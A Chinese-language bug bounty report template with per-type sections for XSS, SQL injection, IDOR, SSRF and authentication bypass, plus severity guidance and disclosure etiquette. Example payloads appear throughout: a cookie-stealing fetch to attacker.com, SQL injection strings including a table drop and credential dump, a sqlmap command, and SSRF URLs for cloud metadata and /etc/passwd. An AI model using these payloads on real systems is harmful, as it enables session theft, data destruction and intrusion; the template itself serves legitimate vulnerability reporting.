# 🐛 漏洞赏金报告模板

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./Bug-Bounty-Report-Template.tr.md) • [🇬🇷 Ελληνικά](./Bug-Bounty-Report-Template.el.md)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

> **译注：** 本文的严重程度与 P1-P4 对应关系是示例，不是所有赏金计划的统一标准；应依据实际影响、证据及项目规则评定。CVSS 向量保留原文的 v3.1 示例，评分须由实际指标重新计算，参见 [FIRST CVSS v3.1 规范](https://www.first.org/cvss/v3.1/specification-document)。XSS 的 Cookie 窃取示例不能读取 HttpOnly Cookie；SSRF 示例是否能取得响应取决于支持的协议与目标服务配置。

---

## 🎯 快速模板

````markdown
## 摘要
[用一句话描述漏洞]

## 严重程度
[Critical/High/Medium/Low] - CVSS: X.X

## 漏洞类型
[XSS/SQLi/IDOR/SSRF/etc.]

## URL/端点
`https://example.com/vulnerable-endpoint`

## 复现步骤
1. 步骤 1
2. 步骤 2
3. 步骤 3

## 影响
[攻击者能够达到的目的]

## 概念验证（PoC）
[代码/截图/视频]

## 修复措施
[如何修复]
````

---

## 📝 完整报告模板

### 标题格式
```
[Severity] [Vulnerability Type]，位于 [Feature/Endpoint]，可导致 [Impact]

示例：
- [Critical] 登录表单 SQL 注入可导致数据库内容泄露
- [High] 存储型 XSS 位于评论功能，可导致账户接管
- [Medium] IDOR in /api/users/{id} 泄露其他用户的个人身份信息（PII）
```

---

## 📋 详细报告结构

````markdown
# [Feature/Endpoint] 中的 [Vulnerability Type]

## 摘要
在 [feature/endpoint] 中发现了 [vulnerability type] 漏洞， 
攻击者可借此实施 [impact]。受影响的范围或用户为 [scope/users]。

## 严重程度评估

| 指标 | 值 |
|--------|-------|
| **严重程度** | 严重 / 高 / 中 / 低 |
| **CVSS 评分** | X.X |
| **CVSS 向量** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [CWE Name] |

## 漏洞详情

### 受影响资产
- **URL:** `https://example.com/path/to/endpoint`
- **参数：** `parameter_name`
- **方法：** GET/POST
- **身份验证：** 需要/不需要

### 存在漏洞的代码或配置
[如可查看且适用]

## 复现步骤

### 前提条件
- 是否需要账户：是/否
- 所需特殊访问权限： [说明]
- 浏览器/工具： [注明]

### 复现步骤

1. **访问存在漏洞的端点**
   ```
   https://example.com/vulnerable-page
   ```

2. **注入载荷（Payload）**
   ```
   [Payload here]
   ```

3. **观察结果**
   - [观察到的现象]

### HTTP 请求
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### HTTP 响应
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## 概念验证（PoC）

### 使用的载荷
```
[Your payload here]
```

### 截图证据
截图占位：`attachment_url`（示例附件未提供，请替换为实际证据文件）。

### 视频 PoC
[视频演示链接]

### 自动化 PoC 脚本（可选）
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## 影响评估

### 技术影响
- **机密性：** [可访问的数据]
- **完整性：** [可修改的数据]
- **可用性：** [可能造成的服务中断]

### 业务影响
- [财务影响]
- [声誉损害]
- [监管或合规违规]
- [受影响用户数量]

### 攻击场景
攻击者可利用此漏洞执行以下操作：
1. [具体操作 1]
2. [具体操作 2]
3. [具体操作 3]

## 修复建议

### 临时修复
[用于缓解风险的临时修复]

### 长期解决方案
[完整修复方案]

### 代码修复示例
```python
# 修复前（存在漏洞）
query = f"SELECT * FROM users WHERE id = {user_input}"

# 修复后
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## 参考资料
- [OWASP 链接]
- [CWE Link]
- [相关 CVE]
- [博客文章或研究]

## 时间安排
| 日期 | 行动 |
|------|--------|
| YYYY-MM-DD | 发现漏洞 |
| YYYY-MM-DD | 提交报告 |
| YYYY-MM-DD | 厂商确认收到 |
| YYYY-MM-DD | 部署修复 |
| YYYY-MM-DD | 发放赏金 |
````

---

## 🔥 按漏洞类型分类的模板

### XSS（跨站脚本）

````markdown
## 摘要
[endpoint] 中的反射型或存储型 XSS 漏洞允许攻击者 
在受害者浏览器中执行任意 JavaScript。

## 载荷
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## 影响
- 通过窃取 Cookie 劫持会话
- 账户接管
- 键盘记录
- 网络钓鱼攻击
- 恶意软件传播

## PoC
```javascript
// Cookie 窃取示例
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### SQL 注入

````markdown
## 摘要
[endpoint] 的 [parameter] 参数存在 SQL 注入，可导致数据库内容泄露。

## 载荷
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## 证据
- 数据库： MySQL 8.0
- 已提取的表： users, orders, payments
- 可访问记录数： 10,000+

## SQLMap 命令
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR（不安全的直接对象引用）

````markdown
## 摘要
[endpoint] 存在 IDOR 漏洞，可访问其他用户的 [resource]。

## 复现过程
1. 以用户 A 登录（ID: 100）
2. 访问： `GET /api/users/100/profile`
3. 将 ID 改为 101： `GET /api/users/101/profile`
4. 观察结果：返回用户 B 的数据

## 影响
- 个人身份信息（姓名、电子邮件、地址）泄露
- 可访问 [X] 名用户的数据
- 可能违反 GDPR 或隐私要求

## 证据
| 请求 | 响应 |
|---------|----------|
| `/api/users/100` | 用户 A 的数据 ✓ |
| `/api/users/101` | 用户 B 的数据 ✗ |
| `/api/users/102` | 用户 C 的数据 ✗ |
````

### SSRF（服务端请求伪造）

````markdown
## 摘要
[feature] 中的 SSRF 漏洞允许向内部服务发起请求。

## 载荷
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## 已访问的内部资源
- AWS 元数据端点
- 内部 Redis 服务器
- 本地文件系统

## 证据
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

### 身份验证绕过

````markdown
## 摘要
[feature] 中的身份验证绕过漏洞允许未经授权访问 [resource]。

## 绕过方法
[描述绕过技术]

## 复现过程
1. 未进行身份验证即访问受保护端点
2. [具体技术]
3. 成功获得访问权限

## 影响
- 访问管理面板
- 冒充用户
- 操纵数据
````

---

## 📊 严重程度指南

### 严重（P1）
```
- RCE（远程代码执行）
- 可提取数据的 SQL 注入
- 绕过身份验证获得管理员访问权限
- 完全接管账户
- 支付或财务操纵
- 所有用户的个人身份信息泄露
```

### 高危（P2）
```
- 具有显著影响的存储型 XSS
- 可访问敏感数据的 IDOR
- 可访问内部服务的 SSRF
- 权限提升
- 敏感数据泄露
```

### 中危（P3）
```
- 反射型 XSS
- 针对敏感操作的 CSRF
- 信息泄露
- 速率限制绕过
- 会话固定
```

### 低危（P4）
```
- Self-XSS（仅影响自身的 XSS）
- 不涉及敏感信息的 IDOR
- 缺少安全响应头
- 错误信息过于详细
- 用户名枚举
```

---

## ✅ 提交检查清单

````markdown
## 提交前

□ 标题清楚，准确描述漏洞
□ 严重程度评估准确
□ 提供逐步复现过程
□ 提供有效的概念验证
□ 清楚说明影响
□ 附上截图或视频
□ 提出修复建议
□ 确认资产属于测试范围
□ 已搜索并确认不是重复报告
□ 已检查语法与拼写
□ 敏感数据已脱敏
□ 包含联系方式
````

---

## 💡 实用建议

### 建议做法 ✅
```
✓ 表达清楚、简洁
✓ 包含所有必要细节
✓ 提供有效的 PoC
✓ 解释影响
✓ 建议修复措施
✓ 保持专业，尊重沟通对象
✓ 遵守负责任披露流程
✓ 及时回复问题
```

### 应避免的做法 ❌
```
✗ 不要访问真实用户数据
✗ 不要在生产环境测试
✗ 不要超出范围
✗ 未经许可不要使用自动扫描器
✗ 修复前不要披露
✗ 不要强硬施压索要赏金
✗ 不要提交重复报告
✗ 不要提交仅有理论推测的问题
```

---

## 📧 沟通模板

### 首次报告
```
[安全团队]，您好：

我在下列产品或功能中发现了严重程度为 [severity] 的 [vulnerability type] 漏洞： 
[product/feature]。完整细节见报告。

摘要： [一句话]
影响： [简述影响]
PoC： [已附上/已包含]

如需更多信息，请随时联系我。

此致
[您的姓名]
[HackerOne/Bugcrowd 个人主页]
```

### 跟进
```
您好：

我想跟进于 [日期] 提交的报告 #[ID]。 
能否告知目前的处理进展？

谢谢。
```

### 赏金讨论
```
感谢您对报告进行分诊。我认为其严重程度应当为 
[更高/其他级别]，原因如下：

1. [原因 1]
2. [原因 2]

能否考虑重新评估赏金金额？
```

---

**报告模板：** 原文指向的目录索引 `./README.md` 未随资料提供。请直接打开同目录的其他报告模板。
